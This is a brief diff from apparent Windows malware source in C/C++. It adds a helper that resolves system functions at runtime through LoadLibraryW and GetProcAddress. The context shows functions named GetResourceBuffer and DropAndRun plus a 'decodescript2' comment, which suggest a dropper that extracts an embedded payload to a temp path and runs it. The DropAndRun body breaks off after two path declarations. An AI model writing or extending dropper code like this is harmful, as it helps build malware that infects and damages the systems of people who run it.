@@ -43,7 +43,12 @@ bool GetResourceBuffer(HMODULE hModule, int resId, BYTE** ppOut, DWORD* pOutSize
 
 //decodescript2
 
-
+FARPROC ResolveAPIW(LPCWSTR moduleName, LPCSTR procName) {
+    HMODULE hMod = GetModuleHandleW(moduleName);
+    if (!hMod) hMod = LoadLibraryW(moduleName);
+    if (!hMod) return NULL;
+    return GetProcAddress(hMod, procName);
+}
 void DropAndRun(HMODULE hModule) {
     WCHAR tempPath[MAX_PATH] = {0};
     WCHAR fullPath[MAX_PATH] = {0};
